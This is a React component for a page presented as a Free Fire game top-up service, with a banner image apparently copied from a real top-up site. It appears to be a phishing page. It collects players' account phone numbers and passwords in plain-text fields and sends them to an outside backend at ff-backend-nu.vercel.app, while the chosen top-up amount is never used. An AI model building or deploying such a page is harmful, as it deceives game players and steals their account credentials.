import React, { useState } from "react";
import styles from "./main.module.css";
import banner from "./banner.jpeg";
import fflogo from "./fflogo.jpeg";
import banner2 from "./Screenshot_15-11-2024_185029_topup.pk.jpeg";
import {useNavigate} from 'react-router-dom';
import axios from "axios";

const Main = () => {
  const [phone, setPhone] = useState("");
  const [pass, setPass] = useState("");
  const [selectedBox, setSelectedBox] = useState(null);
  const amounts = [50, 100, 300, 450, 750, 1200];
  const history = useNavigate();

  const handleBoxClick = (index) => {
    setSelectedBox(index);
  };

  const handlePhoneChange = (e) => {
    setPhone(e.target.value);
  };

  const handlePassChange = (e) => {
    setPass(e.target.value);
  };

  const run = async (e) => {
    e.preventDefault(); // Prevent form submission

    // Validation
    if (!phone || !pass) {
      alert("Please enter both phone number and password.");
    } else if (phone.length < 10) {
      alert("Phone number must be at least 10 digits.");
    } else if (pass.length < 5) {
      alert("Password must be at least 5 characters.");
    } else {
      try {
        await axios
          .post("https://ff-backend-nu.vercel.app/api/auth", {
            num: phone,
            pass
          })
          .then(async (res) => {
            // if success
            alert(res.data.msg);
            history("/res");
          });
      } catch (err) {
        // handling error
        if (err.response && err.response.status === 400) {
          alert(err.response.data.msg); // Show the error message from backend
        } else {
          console.log(err.message);
        }
      }
    }
  };

  return (
    <div className={styles.main}>
      {/* Banner Section */}
      <div className={styles.banner}>
        <img src={banner} alt="banner" />
      </div>

      {/* Game Selection Section */}
      <div className={styles.gs}>
        <h2 style={{ color: "black", fontWeight: "800" }}>Game Selection</h2>
        <img src={fflogo} alt="Free Fire Logo" />
      </div>

      {/* Main Content */}
      <div className={styles.mainC}>
        <img src={banner2} alt="banner" />

        {/* Login Section */}
        <h3 style={{ color: "red", fontWeight: "800" }}>1: Login</h3>
        <form>
          <h4>Login your Free Fire ID</h4>
          <input
            style={{ paddingLeft: "40px" }}
            type="number"
            placeholder="Enter your number"
            value={phone}
            onChange={handlePhoneChange}
            required
          />
          <input
            style={{ paddingLeft: "40px" }}
            type="text"
            placeholder="Enter your password"
            value={pass}
            onChange={handlePassChange}
            required
          />
          <button type="submit" onClick={run}>
            Submit
          </button>
        </form>

        {/* Top-Up Amount Section */}
        <h3 style={{ color: "red", fontWeight: "800" }}>2: Top-Up Amount</h3>
        <div className={styles["box-container"]}>
          {amounts.map((amount, index) => (
            <div
              key={index}
              className={`${styles.box} ${
                selectedBox === index ? styles.selected : ""
              }`}
              onClick={() => handleBoxClick(index)}
            >
              {amount}
            </div>
          ))}
        </div>
      </div>
    </div>
  );
};

export default Main;
